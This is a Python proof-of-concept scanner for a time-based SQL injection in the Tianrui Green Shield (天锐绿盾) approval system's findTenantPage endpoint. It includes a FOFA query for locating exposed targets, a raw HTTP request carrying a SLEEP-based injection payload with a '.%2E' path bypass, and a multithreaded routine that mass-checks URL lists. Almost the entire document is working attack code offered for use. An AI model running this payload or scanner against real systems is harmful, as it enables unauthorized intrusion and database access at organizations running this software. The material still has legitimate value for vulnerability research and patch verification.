# fofa：body="location.href=location.href+\"trwfe\";"||body="天锐绿盾"|| body="天锐" && body="/easyui.css"
"""POST /trwfe/service/.%2E/invoker/findTenantPage.do HTTP/1.1
Host: <目标域名或IP>
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close

sort=(SELECT 2005 FROM (SELECT(SLEEP(3)))IEWh)"""


import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
    __ _           _ _______                     _   _____                             _ 
  / _(_)         | |__   __|                   | | |  __ \                           | |
 | |_ _ _ __   __| |  | | ___ _ __   __ _ _ __ | |_| |__) |_ _  __ _  ___   ___  __ _| |
 |  _| | '_ \ / _` |  | |/ _ \ '_ \ / _` | '_ \| __|  ___/ _` |/ _` |/ _ \ / __|/ _` | |
 | | | | | | | (_| |  | |  __/ | | | (_| | | | | |_| |  | (_| | (_| |  __/ \__ \ (_| | |
 |_| |_|_| |_|\__,_|  |_|\___|_| |_|\__,_|_| |_|\__|_|   \__,_|\__, |\___| |___/\__, |_|
                                                                __/ |  ______      | |  
                                                               |___/  |______|     |_|  
"""
    print(test)



def main():
    banner()
    # 先处理命令行输入的内容
    # 初始化
    parse = argparse.ArgumentParser(description="天锐绿盾审批系统findTenantPage存在SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="Please input your url")
    parse.add_argument('-f','--flie',dest='file',type=str,help="Please input your file")

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数进行判断 只能是单个的，要不一个url，或一个文件
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(targes):
    link = '/trwfe/service/.%2E/invoker/findTenantPage.do'
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "53",
        "Connection": "close"
    }
    proxies = {
        "http" : "http://127.0.0.1:7890",
        "https" : "http://127.0.0.1:7890"
    }
    data = 'sort=(SELECT 2005 FROM (SELECT(SLEEP(3)))IEWh)'
    try:
        res1 = requests.get(url=targes,headers=headers,timeout=15,proxies=proxies,verify=False)
        if res1.status_code == 200:
            res2 =requests.post(url=targes+link,headers=headers,data=data,timeout=15,verify=False,proxies=proxies)
            if res2.elapsed.total_seconds() > 3:
                print(f"[+]该{targes}存在sql注入")
                # with open("result.txt",'a',encoding='utf-8') as f:      # 将结果写入到result.txt文件中
                #     f.write(f"[+]该{targes}存在sql注入"+'\n')
            else:
                print(f"[-]该{targes}不存在sql注入")
    except:
        print(f"该{targes}存在问题，请手工进行测试")


# 函数入口
if __name__ == "__main__":
    main()